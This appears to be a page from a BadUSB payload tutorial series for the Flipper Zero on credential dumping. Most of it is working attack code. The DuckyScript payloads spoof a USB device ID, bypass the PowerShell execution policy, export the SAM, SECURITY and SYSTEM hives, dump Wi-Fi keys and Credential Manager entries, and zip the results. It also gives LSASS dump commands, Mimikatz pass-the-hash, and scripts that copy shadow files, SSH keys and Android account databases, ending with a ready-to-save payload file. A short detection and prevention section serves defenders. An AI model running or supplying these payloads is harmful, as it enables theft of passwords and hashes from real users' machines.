# FZ-A03: Credential Dumping

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A03 |
| **Name** | Credential Dumping |
| **Difficulty** | Advanced |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~15 seconds |
| **Requirements** | Admin privileges |
| **MITRE ATT&CK** | T1003 (OS Credential Dumping) |

## What This Payload Does

Extracts credentials from Windows memory and storage locations. This includes passwords, hashes, and tokens that can be used for lateral movement and privilege escalation.

---

## Understanding Windows Credential Storage

### Credential Locations

```
┌─────────────────────────────────────────────────────────────┐
│              Windows Credential Landscape                    │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   LSASS Process Memory                                       │
│   ├── NTLM Hashes                                            │
│   ├── Kerberos Tickets                                       │
│   ├── WDigest Passwords (plaintext, if enabled)              │
│   └── SSP Credentials                                        │
│                                                               │
│   SAM Database (C:\Windows\System32\config\SAM)              │
│   └── Local account hashes                                   │
│                                                               │
│   SECURITY Hive                                              │
│   └── LSA Secrets, cached credentials                        │
│                                                               │
│   Credential Manager                                         │
│   └── Saved Windows credentials                              │
│                                                               │
│   Browser Credential Stores                                  │
│   └── Website passwords                                      │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM =============================================
REM ADVANCED: Credential Dumping
REM Target: Windows 10/11
REM Action: Extracts credentials
REM Requirements: Admin/SYSTEM
REM Skill: Advanced
REM WARNING: Sensitive data extraction
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open elevated PowerShell (assume UAC bypassed)
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500

REM Credential extraction methods

REM Method 1: SAM and SECURITY hive backup
STRINGLN reg save HKLM\SAM $env:TEMP\sam.hiv /y 2>$null
STRINGLN reg save HKLM\SECURITY $env:TEMP\security.hiv /y 2>$null
STRINGLN reg save HKLM\SYSTEM $env:TEMP\system.hiv /y 2>$null

REM Method 2: Credential Manager dump
STRINGLN cmdkey /list > $env:TEMP\credman.txt

REM Method 3: WiFi passwords
STRINGLN (netsh wlan show profiles) | Select-String ':\s+(.+)$' | ForEach-Object {$n=$_.Matches.Groups[1].Value.Trim();netsh wlan show profile name="$n" key=clear} | Out-File $env:TEMP\wifi_creds.txt

REM Combine results
STRINGLN Get-ChildItem $env:TEMP\*.hiv,$env:TEMP\credman.txt,$env:TEMP\wifi_creds.txt | Compress-Archive -DestinationPath $env:TEMP\creds.zip -Force

STRINGLN Write-Host "Credentials saved to: $env:TEMP\creds.zip"
STRINGLN exit
```

---

## Credential Extraction Methods

### Method 1: Registry Hive Export (Offline Attack)

```powershell
# Export SAM, SECURITY, and SYSTEM hives
# These can be processed offline with impacket/secretsdump
reg save HKLM\SAM C:\temp\sam.hiv
reg save HKLM\SECURITY C:\temp\security.hiv
reg save HKLM\SYSTEM C:\temp\system.hiv

# Process offline with secretsdump
# impacket-secretsdump -sam sam.hiv -security security.hiv -system system.hiv LOCAL
```

### Method 2: Credential Manager

```powershell
# List stored credentials
cmdkey /list

# More detailed with PowerShell
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object {
    $_.RetrievePassword()
    [PSCustomObject]@{
        Resource = $_.Resource
        Username = $_.UserName
        Password = $_.Password
    }
}
```

### Method 3: LSASS Memory Dump

```powershell
# Create minidump of LSASS (requires SYSTEM or SeDebugPrivilege)
$lsass = Get-Process lsass
$path = "C:\temp\lsass.dmp"
rundll32.exe comsvcs.dll, MiniDump $lsass.Id $path full

# Process with Mimikatz offline:
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

### Method 4: Procdump Method

```powershell
# Using Sysinternals Procdump (less detected)
procdump.exe -ma lsass.exe lsass.dmp -accepteula
```

### Method 5: Living Off the Land

```powershell
# Using Task Manager (GUI method)
# Task Manager → Details → lsass.exe → Right-click → Create dump file
```

---

## Cross-Platform Credential Access

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM List keychain items (no passwords without auth)
STRINGLN security dump-keychain > /tmp/keychain_dump.txt

REM Browser credentials (requires user interaction for passwords)
STRINGLN ls -la ~/Library/Keychains/ > /tmp/keychain_locations.txt

REM Safari credentials (Keychain protected)
STRINGLN echo "Safari uses Keychain - protected by macOS security" >> /tmp/keychain_locations.txt
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Shadow file (requires root)
STRINGLN sudo cat /etc/shadow > /tmp/shadow_dump.txt 2>/dev/null

REM Browser credentials
STRINGLN find ~/.mozilla ~/.config/google-chrome -name "*.sqlite" -o -name "Login*" 2>/dev/null > /tmp/browser_creds_paths.txt

REM SSH keys
STRINGLN cat ~/.ssh/id_* > /tmp/ssh_keys.txt 2>/dev/null

REM GNOME Keyring (if present)
STRINGLN ls -la ~/.local/share/keyrings/ > /tmp/keyring_paths.txt 2>/dev/null
```

### Android

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
REM WiFi credentials (root required)
STRINGLN su -c "cat /data/misc/wifi/wpa_supplicant.conf" > /sdcard/wifi_creds.txt 2>/dev/null
STRINGLN su -c "cat /data/misc/wifi/WifiConfigStore.xml" >> /sdcard/wifi_creds.txt 2>/dev/null

REM Account database (root required)
STRINGLN su -c "sqlite3 /data/system/accounts.db .dump" > /sdcard/accounts.txt 2>/dev/null
```

---

## Popular Credential Tools

### Mimikatz (Reference Only)

```
# Classic credential extraction
sekurlsa::logonpasswords

# Export Kerberos tickets
sekurlsa::tickets /export

# Pass-the-hash
sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH
```

### LaZagne (Multi-platform)

```bash
# Windows, macOS, Linux credential harvester
python laZagne.py all
```

### Impacket Secretsdump

```bash
# Dump secrets from registry hives
secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL

# Remote dump (with creds)
secretsdump.py domain/user:password@target
```

---

## Red Team Perspective

### Credential Value

| Credential Type | Use Case |
|----------------|----------|
| NTLM Hash | Pass-the-hash |
| Kerberos TGT | Pass-the-ticket |
| Plaintext | Direct authentication |
| Cached Creds | Offline cracking |
| Service Accts | Lateral movement |

### Attack Chain

```
Initial Access → Privilege Escalation → Credential Dumping → Lateral Movement
                                               ↑
                                           You are here
```

### Credential Use Cases

| Have | Can Do |
|------|--------|
| NTLM hash | PtH, relay attacks |
| Domain admin | DCSync, Golden Ticket |
| Local admin | Access other systems |
| Service account | Access services |

---

## Blue Team Perspective

### Detection Opportunities

1. **LSASS Access**
   - Sysmon Event ID 10 (Process Access)
   - LSASS handle acquisition

2. **Registry Hive Access**
   - SAM/SECURITY/SYSTEM export
   - Registry key access patterns

3. **Known Tools**
   - Mimikatz signatures
   - Common dump tool patterns

### Detection Script

```powershell
# Monitor for LSASS access
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'
    Id=10
} -MaxEvents 100 | Where-Object {
    $_.Message -match 'lsass.exe'
} | Select TimeCreated, @{N='Details';E={$_.Message.Substring(0,300)}}

# Check for registry hive exports
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4688
} -MaxEvents 500 | Where-Object {
    $_.Message -match 'reg.*save.*SAM|reg.*save.*SECURITY|reg.*save.*SYSTEM'
}
```

### Sigma Rule

```yaml
title: Credential Dumping Activity
status: experimental
description: Detects credential dumping techniques
logsource:
    product: windows
    category: process_access
detection:
    selection_lsass:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x1438'
    selection_reg:
        CommandLine|contains|all:
            - 'reg'
            - 'save'
            - 'SAM'
    condition: selection_lsass or selection_reg
level: high
tags:
    - attack.credential_access
    - attack.t1003
```

### Prevention

1. **Credential Guard**
   - Isolates LSASS with virtualization
   - Prevents memory dumping

2. **LSA Protection**
   - `RunAsPPL` registry setting
   - Protected process light

3. **Disable WDigest**
   - Prevents plaintext credential storage
   - HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0

---

## Practice Exercises

### Exercise 1: Check Credential Guard Status
```powershell
Get-ComputerInfo | Select-Object -Property DeviceGuard*
```

### Exercise 2: List Credential Manager Entries
```powershell
cmdkey /list
```

### Exercise 3: Check for WDigest
```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -ErrorAction SilentlyContinue
```

---

## Payload File

Save as `FZ-A03_Credential_Dumping.txt`:

```ducky
REM FZ-A03: Credential Dumping
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500
STRINGLN reg save HKLM\SAM $env:TEMP\sam /y;reg save HKLM\SECURITY $env:TEMP\sec /y;reg save HKLM\SYSTEM $env:TEMP\sys /y;cmdkey /list|Out-File $env:TEMP\cred.txt;Compress-Archive $env:TEMP\sam,$env:TEMP\sec,$env:TEMP\sys,$env:TEMP\cred.txt -DestinationPath $env:TEMP\dump.zip -Force
```

---

[← FZ-A02 UAC Bypass](FZ-A02_UAC_Bypass.md) | [Back to Advanced](README.md) | [Next: FZ-A04 Reverse Shell →](FZ-A04_Reverse_Shell.md)
